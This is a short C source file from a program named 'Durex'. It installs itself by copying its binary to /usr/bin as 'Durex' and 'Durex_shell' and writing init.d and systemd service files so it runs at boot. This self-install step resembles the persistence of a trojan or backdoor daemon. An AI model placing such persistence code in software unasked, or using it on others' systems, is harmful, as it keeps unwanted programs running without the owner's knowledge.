#include "durex.h"
#include "daemon_init.h"

static void	install_daemon_binary(void)
{
	char *binary = NULL;
	size_t size = file_get_contents_size(&binary, "./Durex");

	if (binary == NULL)
		return ;
	// if (file_exists("/usr") == false)
	// 	mkdir("/usr", 0700);
	// if (file_exists("/usr/bin") == false)
	// 	mkdir("/usr/bin", 0700);
	file_put_contents_size("/usr/bin/Durex", binary, size);
	file_put_contents_size("/usr/bin/Durex_shell", binary, size);
}

static void	install_daemon_kernel_runtime(void)
{
	// if (file_exists("/etc") == false)
	// 	mkdir("/etc", 0700);
	// if (file_exists("/etc/init.d") == false)
	// 	mkdir("/etc/init.d", 0700);
	file_put_contents("/etc/init.d/Durex", (char*)daemon_init);
	file_put_contents("/etc/systemd/system/Durex.service", (char*)daemon_init_systemd);
}

void		daemon_install(void)
{
	install_daemon_binary();
	install_daemon_kernel_runtime();
}
